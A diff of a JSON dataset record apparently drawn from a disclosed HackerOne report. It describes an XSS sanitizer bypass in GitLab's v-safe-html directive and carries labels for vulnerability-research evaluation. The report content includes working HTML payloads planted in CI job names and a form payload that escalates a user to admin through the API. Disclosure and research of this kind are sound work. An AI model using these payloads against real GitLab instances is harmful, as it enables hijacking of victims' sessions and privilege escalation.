@@ -1,42 +1,46 @@
 {
-    "reported_to": "GitLab",
-    "reported_by": "yvvdwf ",
-    "title": "XSS: `v-safe-html` is not safe enough",
-    "content": "\nv-safe-html directive uses Dompurify to remove data-remote', 'data-url', 'data-type', 'data-method' attributes from HTML tags. Rails-js relies on another attribute, data-disable-with to show a HTML content when an user clicks on a disabled link.\nFor example, the following text will bypass the sanitization and popup an alert when an user clicks on the link (which is a transparent topmost layer since the sanitization allows also style and class attributes):\nCode 146 Bytes\n1<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">'\nAn exploitation can be done via jobs' error messages which contain CI job names which are provided by users.\nSteps to reproduce\nIn an existing project or create a new one, add .gitlab.ci file with the following content:\nCode 924 Bytes\n1'1. XSS when no CSP<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">':\n2  stage: build\n3  script: echo \"hi\"\n4\n5'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class=\"fixed-top fixed-bottom text-hide cursor-default\" style=\"font-size:10000px\" value=Submit>':\n6  stage: build\n7  script: echo \"hi\"\n8\n9trigger-xss:\n10  stage: test\n11  script: echo \"hi\"\n12  dependencies:\n13    - '1. XSS when no CSP<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">'\n14    - '2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class=\"fixed-top fixed-bottom text-hide cursor-default\" style=\"font-size:10000px\" value=Submit>'\nGo to CI/CD/Jobs tab and wait for the CI jobs finished\nIf you are testing on a local instance without CSP protection, click on detail of the job 1. XSS when no CSP<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">, then click on the trash button on the right literal bar to Erase job logs and artifacts.\nGo back to the job list, click on trigger-xss link to view the detail of this job. Then click on Retry button on the right literal bar to retry the job.\nAn error message appears: This job could not start because it could not retrieve the needed artifacts: 1. XSS when no CSP. Click anywher to trigger the alert\nNote: on gitlab.com or an instance having CSP protection (with strict-dynamic value of script-src), the inline script, such as onerror or the <iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>, will be prevented to trigger. In such a case, we may use <form> tag to trigger arbitrary API requests on behalf of the user, for example, this allows escalate to admin permission when administrator click anywhere 2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class=\"fixed-top fixed-bottom text-hide cursor-default\" style=\"font-size:10000px\" value=Submit>\nImpact\nXSS allow attackers to perform arbitrary actions on behalf of victims at client side.\nExamples\nhttps://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498306483\nhttps://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498287882\nOutput of checks\nThis bug happens on GitLab.com\nImpact\nXSS allow attackers to perform arbitrary actions on behalf of victims at client side.\n\n",
-    "severity": [
-        7.3,
-        null
+  "reported_to": "GitLab",
+  "reported_by": "yvvdwf ",
+  "title": "XSS: `v-safe-html` is not safe enough",
+  "content": "\nv-safe-html directive uses Dompurify to remove data-remote', 'data-url', 'data-type', 'data-method' attributes from HTML tags. Rails-js relies on another attribute, data-disable-with to show a HTML content when an user clicks on a disabled link.\nFor example, the following text will bypass the sanitization and popup an alert when an user clicks on the link (which is a transparent topmost layer since the sanitization allows also style and class attributes):\nCode 146 Bytes\n1<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">'\nAn exploitation can be done via jobs' error messages which contain CI job names which are provided by users.\nSteps to reproduce\nIn an existing project or create a new one, add .gitlab.ci file with the following content:\nCode 924 Bytes\n1'1. XSS when no CSP<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">':\n2  stage: build\n3  script: echo \"hi\"\n4\n5'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class=\"fixed-top fixed-bottom text-hide cursor-default\" style=\"font-size:10000px\" value=Submit>':\n6  stage: build\n7  script: echo \"hi\"\n8\n9trigger-xss:\n10  stage: test\n11  script: echo \"hi\"\n12  dependencies:\n13    - '1. XSS when no CSP<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">'\n14    - '2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class=\"fixed-top fixed-bottom text-hide cursor-default\" style=\"font-size:10000px\" value=Submit>'\nGo to CI/CD/Jobs tab and wait for the CI jobs finished\nIf you are testing on a local instance without CSP protection, click on detail of the job 1. XSS when no CSP<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">, then click on the trash button on the right literal bar to Erase job logs and artifacts.\nGo back to the job list, click on trigger-xss link to view the detail of this job. Then click on Retry button on the right literal bar to retry the job.\nAn error message appears: This job could not start because it could not retrieve the needed artifacts: 1. XSS when no CSP. Click anywher to trigger the alert\nNote: on gitlab.com or an instance having CSP protection (with strict-dynamic value of script-src), the inline script, such as onerror or the <iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>, will be prevented to trigger. In such a case, we may use <form> tag to trigger arbitrary API requests on behalf of the user, for example, this allows escalate to admin permission when administrator click anywhere 2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class=\"fixed-top fixed-bottom text-hide cursor-default\" style=\"font-size:10000px\" value=Submit>\nImpact\nXSS allow attackers to perform arbitrary actions on behalf of victims at client side.\nExamples\nhttps://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498306483\nhttps://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498287882\nOutput of checks\nThis bug happens on GitLab.com\nImpact\nXSS allow attackers to perform arbitrary actions on behalf of victims at client side.\n\n",
+  "severity": [
+    7.3,
+    null
+  ],
+  "bounty": 1000,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1668578880,
+  "report_url": "https://hackerone.com/reports/1579645",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Create a .gitlab.ci file with malicious job names containing XSS payloads in the data-disable-with attribute"
     ],
-    "bounty": 1000,
-    "weaknesses": [
-        "Cross-site Scripting (XSS) - Generic"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1668578880,
-    "report_url": "https://hackerone.com/reports/1579645",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Create a .gitlab.ci file with malicious job names containing XSS payloads in the data-disable-with attribute"
-        ],
-        [
-            2,
-            "Trigger the CI jobs, then interact with the job interface to trigger the XSS payload when viewing error messages"
-        ]
-    ],
-    "vuln_description": "The vulnerability is an XSS flaw in GitLab's job error message handling where the v-safe-html directive fails to properly sanitize the data-disable-with attribute, allowing JavaScript execution when users interact with certain UI elements. The attack can be delivered through specially crafted CI job names and can lead to arbitrary actions on behalf of victims.",
-    "reason": "This vulnerability requires understanding of multiple components: GitLab CI job naming, the v-safe-html directive's sanitization behavior, Rails-js's handling of data-disable-with attributes, and the specific UI interaction flow that triggers the XSS. The attack involves subtle interactions between these components and requires crafting a payload that bypasses the sanitizer while being triggered through a non-obvious UI interaction path.",
-    "new_complexity": "HIGH",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The vulnerability involves bypassing the sanitization of HTML attributes in a way that allows XSS attacks. The proposed methodology focuses on authentication and authorization bypasses (AuthN/AuthZ) by testing different user sessions and resource IDs. However, the XSS vulnerability described does not directly involve AuthN/AuthZ bypass but rather exploits a sanitization flaw in HTML handling. The methodology does not cover parsing and testing HTML sanitization logic or attribute handling, which is the core of this vulnerability.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Trigger the CI jobs, then interact with the job interface to trigger the XSS payload when viewing error messages"
+    ]
+  ],
+  "vuln_description": "The vulnerability is an XSS flaw in GitLab's job error message handling where the v-safe-html directive fails to properly sanitize the data-disable-with attribute, allowing JavaScript execution when users interact with certain UI elements. The attack can be delivered through specially crafted CI job names and can lead to arbitrary actions on behalf of victims.",
+  "reason": "This vulnerability requires understanding of multiple components: GitLab CI job naming, the v-safe-html directive's sanitization behavior, Rails-js's handling of data-disable-with attributes, and the specific UI interaction flow that triggers the XSS. The attack involves subtle interactions between these components and requires crafting a payload that bypasses the sanitizer while being triggered through a non-obvious UI interaction path.",
+  "new_complexity": "HIGH",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The XSS vulnerability involves client-side script execution through manipulated HTML attributes, which is not directly related to authentication or authorization bypasses. The methodology described focuses on testing authentication and authorization boundaries by swapping user sessions and resource IDs, not on detecting XSS or HTML sanitization bypasses.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The XSS vulnerability in GitLab CI job names can be discovered via the methodology because:\n1. Job names are user-controlled parameters visible during regular navigation of CI/CD pipelines.\n2. The payload uses basic HTML injection with `data-disable-with` attribute, which qualifies as a 'simple payload' under the methodology (no complex encoding/filter bypass required).\n3. Execution occurs in the same channel - the malicious payload triggers when viewing job dependencies/error messages through normal UI interactions (retrying jobs, viewing logs).\n4. While CSP bypass requires additional steps, the core injection vector meets the 'simple payload' criteria as it leverages allowed attributes/sanitizer gaps without advanced obfuscation.",
+    "is_simple_injection": true
+  }
 }
